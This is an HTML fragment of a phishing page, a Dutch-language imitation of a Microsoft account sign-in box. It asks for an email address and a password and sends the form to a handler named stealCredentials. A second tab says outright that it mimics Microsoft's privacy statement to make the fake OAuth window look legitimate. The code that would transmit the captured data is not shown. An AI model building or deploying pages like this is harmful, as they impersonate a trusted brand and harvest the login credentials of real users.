<div class="login-box microsoft" id="loginFormContainer">
    <div id="tab1-content" class="tab-content active">
        <div class="logo-ms">■■<br>■■</div>
        <h3>Aanmelden</h3>
        <p style="font-size: 14px; margin-bottom: 20px;">Gebruik je Microsoft-account</p>
        <form onsubmit="stealCredentials(event)">
            <input type="text" id="inputUser" placeholder="E-mailadres, telefoonnummer of Skype" required><br><br>
            <input type="password" id="inputPass" placeholder="Wachtwoord" required><br><br>
            <button type="submit" class="btn-ms">Volgende</button>
        </form>
    </div>
    <div id="tab2-content" class="tab-content" style="display: none; text-align: left;">
        <h3>Microsoft Privacy</h3>
        <p style="font-size: 13px; line-height: 1.6; color: #555;">
            Dit tabblad simuleert de officiële privacyverklaring om de illusie van een legitiem Microsoft OAuth-venster compleet te maken.
        </p>
    </div>
</div>
